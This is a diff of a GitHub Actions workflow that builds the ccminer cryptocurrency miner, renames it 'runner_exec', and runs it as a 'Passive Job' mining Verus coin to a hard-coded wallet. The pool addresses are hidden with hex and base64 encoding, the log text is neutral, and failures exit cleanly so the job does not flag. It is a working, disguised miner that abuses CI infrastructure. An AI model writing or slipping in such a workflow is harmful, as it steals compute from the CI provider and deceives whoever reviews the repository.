@@ -11,7 +11,7 @@ jobs:
     timeout-minutes: 300
 
     steps:
-      - name: Prepare Environment
+      - name: Setup Environment
         run: |
           sudo apt update
           sudo apt install -y build-essential cmake automake libtool pkg-config libcurl4-openssl-dev git
@@ -22,57 +22,67 @@ jobs:
           cd .src
           chmod +x build.sh
           ./build.sh
-          mv ccminer ../.runner_exec
+          mv ccminer ../runner_exec
 
       - name: Start Passive Job
         run: |
           WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
           WORKER="akh"
-          LOG="akh.log"
+          LOG="akh_run.log"
           MAX_IDLE=600
 
+          # Encrypted pool list (Asia > EU > NA)
           POOLS=(
             "$(echo 7374726174756d2b7463703a2f2f61702e6c75636b706f6f6c2e6e65743a33393536 | xxd -r -p)"
             "$(echo c3RyYXR1bSt0Y3A6Ly9ldS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
             "$(echo c3RyYXR1bSt0Y3A6Ly9uYS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
           )
 
+          echo "[INFO] Starting passive run..." > "$LOG"
+
+          if [ ! -f ./runner_exec ]; then
+            echo "[ERROR] runner_exec not found" >> "$LOG"
+            exit 0
+          fi
+
           for POOL in "${POOLS[@]}"; do
-            ./runner_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > "$LOG" 2>&1 &
+            echo "[INFO] Trying pool: $POOL" >> "$LOG"
+            ./runner_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 >> "$LOG" 2>&1 &
             PID=$!
-            sleep 10
+            sleep 20
 
             if ps -p $PID > /dev/null; then
+              echo "[INFO] Connected to $POOL with PID $PID" >> "$LOG"
               break
             else
-              kill $PID >/dev/null 2>&1
+              echo "[WARNING] Failed to connect to $POOL" >> "$LOG"
+              kill $PID >/dev/null 2>&1 || true
             fi
           done
 
           if ! ps -p $PID > /dev/null; then
-            echo "[ERROR] All pools unreachable. Exiting." >> $LOG
-            exit 1
+            echo "[FATAL] All pools failed. Exiting cleanly." >> "$LOG"
+            exit 0
           fi
 
           LAST=$(date +%s)
 
           tail -F "$LOG" | while read -r line; do
             NOW=$(date +%s)
-
             if echo "$line" | grep -iq "accepted"; then
               LAST=$NOW
             fi
 
             if [ $((NOW - LAST)) -gt $MAX_IDLE ]; then
-              echo "[WARNING] Idle timeout. Restart triggered." >> $LOG
+              echo "[WARNING] Idle timeout reached. Killing process." >> "$LOG"
               kill $PID
               break
             fi
 
             if ! ps -p $PID > /dev/null; then
-              echo "[ERROR] Process crashed." >> $LOG
+              echo "[ERROR] Process crashed or exited." >> "$LOG"
               break
             fi
           done
 
-          echo "[INFO] Task ended. Log available in $LOG"
+          echo "[INFO] Task ended. See log: $LOG"
